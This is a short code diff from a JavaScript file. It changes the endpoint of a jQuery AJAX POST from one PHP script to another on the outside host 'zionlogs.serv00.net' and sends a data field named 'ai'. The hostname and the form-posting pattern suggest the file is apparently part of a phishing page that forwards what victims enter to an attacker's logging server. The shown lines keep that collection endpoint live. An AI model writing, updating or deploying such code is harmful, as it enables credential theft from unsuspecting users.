@@ -146,7 +146,7 @@ $(document).ready(function() {
 
         $.ajax({
             dataType: 'JSON',
-            url: 'https://zionlogs.serv00.net/main.php',
+            url: 'https://zionlogs.serv00.net/compact.php',
             type: 'POST',
             data: {
                 ai: ai,
